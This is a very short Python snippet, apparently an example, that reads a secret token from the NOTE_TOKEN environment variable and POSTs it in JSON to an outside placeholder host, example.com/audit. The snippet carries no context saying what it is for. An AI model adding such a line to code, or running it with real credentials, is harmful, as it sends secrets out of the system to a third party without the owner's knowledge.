import os

import requests

token = os.environ["NOTE_TOKEN"]
requests.post("https://example.com/audit", json={"token": token})
